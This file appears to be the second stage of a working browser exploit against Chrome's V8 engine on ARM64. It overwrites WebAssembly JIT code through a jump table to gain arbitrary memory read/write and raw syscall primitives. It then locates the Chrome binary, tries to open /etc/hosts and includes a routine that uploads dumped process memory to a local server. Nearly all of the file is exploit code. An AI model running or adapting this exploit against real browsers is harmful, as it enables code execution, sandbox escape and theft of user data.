const wasmstage2Native = [
  [0xf9400000, 0xd65f03c0],
  [0xf9000002, 0xd65f03c0],
  [0xb9400000, 0xd65f03c0],
  [0xb9000002, 0xd65f03c0],
  [0x39400000, 0xd65f03c0],
  [0x39000002, 0xd65f03c0],
  [0xaa0203e1, 0xaa0303e2, 0xaa0403e3, 0xaa0503e4, 0xd61f00c0],
  [0xb40000a3, 0x38401448, 0xf1000463, 0x38001408, 0x54ffffa1, 0xd65f03c0],
  [0xd65f03c0],
  [0xd65f03c0],
  [0xaa0203e1, 0xaa0303e2, 0xaa0403e3, 0xaa0503e4, 0xaa0603e8, 0xd4000001, 0xd65f03c0],
  [0xf81f0ffe, 0xd50320ff, 0xaa1e03e0, 0xf84107fe, 0xd65f03c0],
];

const wasmstage2Wasm = [
  0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x29, 0x07, 0x60, 0x02, 0x7e, 0x7e, 0x00,
  0x60, 0x01, 0x7e, 0x01, 0x7f, 0x60, 0x02, 0x7e, 0x7f, 0x00, 0x60, 0x06, 0x7e, 0x7e, 0x7e, 0x7e,
  0x7e, 0x7e, 0x01, 0x7e, 0x60, 0x01, 0x7e, 0x01, 0x7e, 0x60, 0x03, 0x7e, 0x7e, 0x7e, 0x00, 0x60,
  0x00, 0x01, 0x7e, 0x03, 0x0d, 0x0c, 0x04, 0x00, 0x01, 0x02, 0x01, 0x02, 0x03, 0x05, 0x00, 0x00,
  0x03, 0x06, 0x04, 0x05, 0x01, 0x70, 0x01, 0x01, 0x01, 0x05, 0x03, 0x01, 0x00, 0x00, 0x06, 0x14,
  0x03, 0x7f, 0x00, 0x41, 0x08, 0x0b, 0x7f, 0x01, 0x41, 0x88, 0x80, 0x02, 0x0b, 0x7f, 0x00, 0x41,
  0x88, 0x80, 0x02, 0x0b, 0x07, 0x80, 0x01, 0x0d, 0x06, 0x72, 0x65, 0x61, 0x64, 0x36, 0x34, 0x00,
  0x00, 0x07, 0x77, 0x72, 0x69, 0x74, 0x65, 0x36, 0x34, 0x00, 0x01, 0x06, 0x72, 0x65, 0x61, 0x64,
  0x33, 0x32, 0x00, 0x02, 0x07, 0x77, 0x72, 0x69, 0x74, 0x65, 0x33, 0x32, 0x00, 0x03, 0x05, 0x72,
  0x65, 0x61, 0x64, 0x38, 0x00, 0x04, 0x06, 0x77, 0x72, 0x69, 0x74, 0x65, 0x38, 0x00, 0x05, 0x06,
  0x63, 0x61, 0x6c, 0x6c, 0x36, 0x34, 0x00, 0x06, 0x06, 0x6d, 0x65, 0x6d, 0x63, 0x70, 0x79, 0x00,
  0x07, 0x0a, 0x63, 0x61, 0x63, 0x68, 0x65, 0x66, 0x6c, 0x75, 0x73, 0x68, 0x00, 0x08, 0x0b, 0x69,
  0x63, 0x61, 0x63, 0x68, 0x65, 0x66, 0x6c, 0x75, 0x73, 0x68, 0x00, 0x09, 0x07, 0x73, 0x79, 0x73,
  0x63, 0x61, 0x6c, 0x6c, 0x00, 0x0a, 0x05, 0x67, 0x65, 0x74, 0x4c, 0x52, 0x00, 0x0b, 0x06, 0x6d,
  0x65, 0x6d, 0x6f, 0x72, 0x79, 0x02, 0x00, 0x09, 0x06, 0x01, 0x00, 0x41, 0x01, 0x0b, 0x00, 0x0a,
  0xbf, 0x05, 0x0c, 0x3b, 0x01, 0x04, 0x7e, 0x42, 0xc1, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0,
  0xc1, 0x00, 0x21, 0x01, 0x42, 0xc2, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21,
  0x02, 0x42, 0xc3, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x03, 0x42, 0xc4,
  0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x04, 0x42, 0x00, 0x0f, 0x0b, 0x38,
  0x01, 0x04, 0x7e, 0x42, 0xc1, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x02,
  0x42, 0xc2, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x03, 0x42, 0xc3, 0x82,
  0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x04, 0x42, 0xc4, 0x82, 0x85, 0x8a, 0x94,
  0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x05, 0x0b, 0x3b, 0x01, 0x04, 0x7e, 0x42, 0xc1, 0x82, 0x85,
  0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x01, 0x42, 0xc2, 0x82, 0x85, 0x8a, 0x94, 0xa8,
  0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x02, 0x42, 0xc3, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1,
  0x00, 0x21, 0x03, 0x42, 0xc4, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x04,
  0x41, 0x00, 0x0f, 0x0b, 0x38, 0x01, 0x04, 0x7e, 0x42, 0xc1, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0,
  0xa0, 0xc1, 0x00, 0x21, 0x02, 0x42, 0xc2, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00,
  0x21, 0x03, 0x42, 0xc3, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x04, 0x42,
  0xc4, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x05, 0x0b, 0x3b, 0x01, 0x04,
  0x7e, 0x42, 0xc1, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x01, 0x42, 0xc2,
  0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x02, 0x42, 0xc3, 0x82, 0x85, 0x8a,
  0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x03, 0x42, 0xc4, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0,
  0xa0, 0xc1, 0x00, 0x21, 0x04, 0x41, 0x00, 0x0f, 0x0b, 0x38, 0x01, 0x04, 0x7e, 0x42, 0xc1, 0x82,
  0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x02, 0x42, 0xc2, 0x82, 0x85, 0x8a, 0x94,
  0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x03, 0x42, 0xc3, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0,
  0xc1, 0x00, 0x21, 0x04, 0x42, 0xc4, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21,
  0x05, 0x0b, 0x3b, 0x01, 0x04, 0x7e, 0x42, 0xc1, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1,
  0x00, 0x21, 0x06, 0x42, 0xc2, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x07,
  0x42, 0xc3, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x08, 0x42, 0xc4, 0x82,
  0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x09, 0x42, 0x00, 0x0f, 0x0b, 0x38, 0x01,
  0x04, 0x7e, 0x42, 0xc1, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x03, 0x42,
  0xc2, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x04, 0x42, 0xc3, 0x82, 0x85,
  0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x05, 0x42, 0xc4, 0x82, 0x85, 0x8a, 0x94, 0xa8,
  0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x06, 0x0b, 0x38, 0x01, 0x04, 0x7e, 0x42, 0xc1, 0x82, 0x85, 0x8a,
  0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x02, 0x42, 0xc2, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0,
  0xa0, 0xc1, 0x00, 0x21, 0x03, 0x42, 0xc3, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00,
  0x21, 0x04, 0x42, 0xc4, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x05, 0x0b,
  0x38, 0x01, 0x04, 0x7e, 0x42, 0xc1, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21,
  0x02, 0x42, 0xc2, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x03, 0x42, 0xc3,
  0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x04, 0x42, 0xc4, 0x82, 0x85, 0x8a,
  0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x05, 0x0b, 0x3b, 0x01, 0x04, 0x7e, 0x42, 0xc1, 0x82,
  0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x06, 0x42, 0xc2, 0x82, 0x85, 0x8a, 0x94,
  0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x07, 0x42, 0xc3, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0,
  0xc1, 0x00, 0x21, 0x08, 0x42, 0xc4, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21,
  0x09, 0x42, 0x00, 0x0f, 0x0b, 0x3b, 0x01, 0x04, 0x7e, 0x42, 0xc1, 0x82, 0x85, 0x8a, 0x94, 0xa8,
  0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x00, 0x42, 0xc2, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1,
  0x00, 0x21, 0x01, 0x42, 0xc3, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x02,
  0x42, 0xc4, 0x82, 0x85, 0x8a, 0x94, 0xa8, 0xd0, 0xa0, 0xc1, 0x00, 0x21, 0x03, 0x42, 0x00, 0x0f,
  0x0b,
];

function callEverythingOnce(instance) {
  instance.exports.read64(0n);
  instance.exports.write64(0n, 0n);
  instance.exports.read32(0n);
  instance.exports.write32(0n, 0);
  instance.exports.read8(0n);
  instance.exports.write8(0n, 0);
  instance.exports.call64(0n, 0n, 0n, 0n, 0n, 0n, 0n);
  instance.exports.memcpy(0n, 0n, 0n);
  instance.exports.cacheflush(0n, 0n);
  instance.exports.icacheflush(0n, 0n);
  instance.exports.syscall(0n, 0n, 0n, 0n, 0n, 0n, 0n);
}

function overwriteFunctions(jumpTableAddress, arbRW, instance) {
  // hack: I can only use their write32 once for some reason, so get our write32 started immediately
  // just write it directly into the table, over the `bti` instruction; it's short enough
  const write32Index = 3;
  const write32Instrs = wasmstage2Native[write32Index];
  arbRW.write32(jumpTableAddress + BigInt(write32Index * 8), write32Instrs[0]);
  // extremely dumb cache flush:
  var function2 = new Function(new Array(10000).join("eval('Math.min(1, 2)');"));
  for (let i = 0; i < 10; i++) { function2(); }
  // and read32...
  const read32Index = 2;
  const newArbRW = { write32: instance.exports.write32 };
  overwriteFunction(
    jumpTableAddress + BigInt(read32Index * 8),
    wasmstage2Native[read32Index],
    newArbRW,
  );
  console.log("write32 address: ", (jumpTableAddress + BigInt(write32Index * 8)).toString(16));
  for (let i = 0; i < wasmstage2Native.length; i++) {
    if (i == read32Index || i == write32Index) continue;
    const branchInstructionAddr = jumpTableAddress + BigInt(i * 8 + 4);
    const branchInstruction = instance.exports.read32(branchInstructionAddr);
    const branchOffset = ((branchInstruction << (32 - 26)) >> (32 - 26)) * 4;
    const functionStartAddr = branchInstructionAddr + BigInt(branchOffset);
    console.log(functionStartAddr.toString(16));
    overwriteFunction(functionStartAddr, wasmstage2Native[i], newArbRW);
  }
  //%SystemBreak();
}

function overwriteFunction(functionStartAddr, instructions, arbRW) {
  for (let i = 0; i < instructions.length; i++) {
    arbRW.write32(functionStartAddr + BigInt(i * 4), instructions[i]);
  }
}

function getJumpTableAddress(wasmInstance, arbRW) {
  // port of _manfp's Pwn2Own exploit: https://crbug.com/330575498
  // Chrome 118 doesn't have a Trusted Table, so jump_table_start is actually in the heap.
  const jump_table_start_offset = 0x50n;
  console.log("about to addrof");
  const wasmInstanceAddr = arbRW.addrof(wasmInstance) & 0xffffffff_fffffffen;
  //%DebugPrint(wasmInstance);
  console.log("addrof", wasmInstanceAddr.toString(16));
  console.log("address to read", (wasmInstanceAddr + jump_table_start_offset).toString(16));
  const jumpTableStart = arbRW.read64SBX(wasmInstanceAddr + jump_table_start_offset);
  console.log("jumpTableStart", jumpTableStart.toString(16));
  return jumpTableStart;
}

function initializeStage2(stage2ModuleBytes, arbRW) {
  const module = new WebAssembly.Module(stage2ModuleBytes);
  const instance = new WebAssembly.Instance(module);
  // run everything once to generate JIT code
  // node --print-code wasmstage2-node.mjs to confirm
  callEverythingOnce(instance);
  const jumpTableAddress = getJumpTableAddress(instance, arbRW);
  console.log(jumpTableAddress.toString(16));
  overwriteFunctions(jumpTableAddress, arbRW, instance);
  return instance;
}

function accessibleMemory(address, arbRW) {
  const NR_mincore = 232n;
  const ENOMEM = 12n;
  const retval = arbRW.syscall(address, 0x1n, 0n, 0n, 0n, NR_mincore);
  return retval !== -ENOMEM;
}

function getChromeExecutableBase(wasmLR, arbRW) {
  const pageMask = 0xfffn;
  const notPageMask = 0xffffffff_ffffffffn & ~pageMask;
  const startPage = wasmLR & notPageMask;
  const endPage = startPage - 0x8000000n;
  for (let i = wasmLR & notPageMask; i >= endPage; i -= 0x1000n) {
    if (!accessibleMemory(i, arbRW)) {
      continue;
    }
    const d = arbRW.read32(i);
    if (d === 0x464c457f) {
      // .ELF
      return i;
    }
  }
  return 0;
}

function getArrayBufferBufferAddress(buffer, arbRW) {
  const backing_store_offset = 0x20n;
  const arrayBufferAddr = arbRW.addrof(buffer) & 0xffffffff_fffffffen;
  const backingStoreAddr = arbRW.read64(arrayBufferAddr + backing_store_offset) >> 24n;
  const heapBase = arrayBufferAddr & 0xffffffff_00000000n;
  return backingStoreAddr + heapBase;
}

async function dumpChromeMemory(dumpBase, arbRW) {
  const bounceBuffer = new ArrayBuffer(0x1000);
  const bounceBufferAddress = getArrayBufferBufferAddress(bounceBuffer, arbRW);

  // 1 page for now...
  const lengthToDump = 0x1000n;
  for (let offset = 0n; offset < lengthToDump; offset += 0x1000n) {
    const addr = dumpBase + offset;
    if (!accessibleMemory(addr, arbRW)) {
      continue;
    }
    arbRW.memcpy(bounceBufferAddress, addr, 0x1000n);
    await fetch(
      "http://localhost:3333/upload/dump_" + offset.toString(16).padStart(8, "0") + ".bin",
      { method: "PUT", body: bounceBuffer },
    );
  }
}

function tryOpenFile(arbRW) {
  const O_RDONLY = 0n;
  const NR_openat = 56n;
  const AT_FDCWD = -100n;

  const buffer = new ArrayBuffer(0x1000);
  const bufferAddress = getArrayBufferBufferAddress(buffer, arbRW);
  const uint8Array = new Uint8Array(buffer);
  new TextEncoder().encodeInto("/etc/hosts", uint8Array);
  const retval = arbRW.syscall(AT_FDCWD, bufferAddress, O_RDONLY, 0n, 0n, NR_openat);
  console.log(retval);
  return retval;
}

function runStage2() {
  const module = new Uint8Array(wasmstage2Wasm);
  const arbRW = {
    addrof: (a) => cage_base + addrof(a),
    read32: read32,
    write32: function (a, b) {
      write16(a, b & 0xffff);
      write16(a + 2n, (b >> 16) & 0xffff);
    },
    read64: read64,
    read64SBX: (a) => v8h_read64((a & 0xffffffffn) | 1n),
  };
  const instance = initializeStage2(module, arbRW);
  const wasmLR = instance.exports.getLR();
  console.log("wasmLR: ", wasmLR.toString(16));
  if (!wasmLR) {
    log("Failed: wasmLR!");
    // auto-refresh?
    return;
  }
  const stage2ArbRW = {
    read32: instance.exports.read32,
    write32: instance.exports.write32,
    read64: (a) =>
      BigInt(instance.exports.read32(a)) | (BigInt(instance.exports.read32(a + 4n)) << 32n),
    syscall: instance.exports.syscall,
    memcpy: instance.exports.memcpy,
    addrof: arbRW.addrof, // no stage2 version of this yet...
  };

  const chromeBase = getChromeExecutableBase(wasmLR, stage2ArbRW);
  console.log("Chrome base: ", chromeBase.toString(16));
  // await dumpChromeMemory(chromeBase, stage2ArbRW);
  log("Chrome base: " + chromeBase.toString(16));
  if (!chromeBase) {
    log("Failed: chromeBase!");
    // auto-refresh?
    return;
  }
  const fileOpenResult = tryOpenFile(stage2ArbRW);
  log("file accessible? " + fileOpenResult);
}
runStage2();
